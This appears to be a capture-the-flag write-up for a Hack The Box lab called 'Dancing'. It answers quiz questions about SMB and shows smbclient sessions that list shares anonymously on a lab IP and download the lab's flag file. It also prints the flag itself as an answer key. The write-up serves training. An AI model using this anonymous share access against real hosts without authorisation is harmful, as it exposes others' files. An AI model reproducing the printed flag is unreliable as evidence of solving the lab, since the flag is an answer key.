# Dancing

> What does the 3-letter acronym SMB stand for? 

#### Server Message Block

---

> What port does SMB use to operate at? 

#### 445 

---

> What network communication model does SMB use, architecturally speaking? 

#### client-server model 

---

> What is the service name for port 445 that came up in our nmap scan?

#### microsoft-ds 

---

> What is the tool we use to connect to SMB shares from our Linux distribution?

#### smbclient

---

> What is the `flag` or `switch` we can use with the SMB tool to `list` the contents of the share? 

#### -L 

---

> What is the name of the share we are able to access in the end?

```console
$ smbclient -L 10.129.217.4
Enter WORKGROUP\marco's password:

        Sharename       Type      Comment
        ---------       ----      -------
        ADMIN$          Disk      Remote Admin
        C$              Disk      Default share
        IPC$            IPC       Remote IPC
        WorkShares      Disk
SMB1 disabled -- no workgroup available
```

The password can be empty

#### WorkShares 

---

> What is the command we can use within the SMB shell to download the files we find? 

#### get 

---

> Submit root flag 

This time we can connect directly to `WorkShares`

```console
$ smbclient //10.129.217.4/WorkShares
Enter WORKGROUP\marco's password:
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Mon Mar 29 10:22:01 2021
  ..                                  D        0  Mon Mar 29 10:22:01 2021
  Amy.J                               D        0  Mon Mar 29 11:08:24 2021
  James.P                             D        0  Thu Jun  3 10:38:03 2021

                5114111 blocks of size 4096. 1732742 blocks available
```

Now is time to find and get the flag

```console
smb: \> get James.P\flag.txt
getting file \James.P\flag.txt of size 32 as James.P\flag.txt (0,0 KiloBytes/sec) (average 0,0 KiloBytes/sec)
smb: \> exit

$ cat James.P\\flag.txt
5f61c10dffbc77a704d76016a22f1664
```

#### HTB{5f61c10dffbc77a704d76016a22f1664}
